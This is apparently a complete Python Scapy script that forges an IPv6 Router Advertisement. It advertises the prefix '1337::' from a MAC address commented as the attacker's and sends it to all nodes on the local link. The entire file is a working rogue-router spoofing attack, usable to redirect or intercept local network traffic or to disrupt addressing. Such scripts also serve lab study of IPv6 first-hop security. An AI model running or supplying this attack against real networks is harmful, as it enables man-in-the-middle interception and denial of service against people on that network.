#!/usr/bin/env python
from scapy.all import *

a = IPv6()
a.dst = "ff02::1"
a.display()
b = ICMPv6ND_RA()
c = ICMPv6NDOptSrcLLAddr()
c.lladdr = "00:0c:29:2d:e6:5e"	# ATTACKER_ETHER
d = ICMPv6NDOptMTU()
e = ICMPv6NDOptPrefixInfo()
e.prefixlen = 64
e.prefix = "1337::"
send(a/b/c/d/e)
